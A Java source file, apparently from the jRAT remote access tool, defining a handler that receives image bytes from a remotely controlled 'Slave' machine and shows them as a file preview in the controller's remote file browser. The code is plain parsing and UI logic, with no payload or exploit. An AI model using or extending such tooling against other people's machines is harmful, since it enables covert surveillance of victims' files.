package jrat.module.fs.packets;

import jrat.common.utils.ImageUtils;
import jrat.controller.Slave;
import jrat.controller.packets.incoming.AbstractIncomingPacket;
import jrat.module.fs.ui.FrameRemoteFiles;
import jrat.module.fs.ui.previews.FramePreviewImage;

import java.awt.image.BufferedImage;

public class Packet43PreviewImage extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave) throws Exception {
	    String path = slave.readLine();
		int imageSize = slave.readInt();

		byte[] buffer = new byte[imageSize];
		slave.readFully(buffer);

		FrameRemoteFiles panel = (FrameRemoteFiles) slave.getPanel(FrameRemoteFiles.class);

		if (panel != null) {
		    FramePreviewImage preview = (FramePreviewImage) panel.getPreviewHandler(path);

		    if (preview != null) {
                BufferedImage image = ImageUtils.decodeImage(buffer);

                preview.addData(image);
            }
		}
	}
}
